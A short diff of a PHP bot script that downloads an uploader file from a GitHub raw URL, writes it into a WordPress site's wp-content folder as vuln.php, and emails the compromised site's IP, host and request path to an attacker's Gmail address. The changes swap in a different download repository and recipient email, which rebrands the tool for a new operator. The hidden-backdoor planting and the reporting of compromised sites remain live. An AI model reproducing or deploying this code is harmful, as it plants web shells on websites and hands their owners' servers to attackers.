@@ -10,7 +10,7 @@ function http_get($url){
 	curl_close($im);
 }
 $check = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/vuln.php" ;
-$text = http_get('https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/files/up.php');
+$text = http_get('https://raw.githubusercontent.com/mrxmod/PythonBot/master/files/up.php');
 $open = fopen($check, 'w');
 fwrite($open, $text);
 fclose($open);
@@ -37,7 +37,7 @@ echo "done .\n " ;
 $ip = getenv("REMOTE_ADDR");
 $ra44 = rand(1, 99999);
 $subj98 = " Bot V3 Rzlt |$ip";
-$email = "sellerolux@gmail.com";
+$email = "mrxmod1337@gmail.com";
 $from = "From: Result<botv3@mrspybotv3.com";
 $a45 = $_SERVER['REQUEST_URI'];
 $b75 = $_SERVER['HTTP_HOST'];
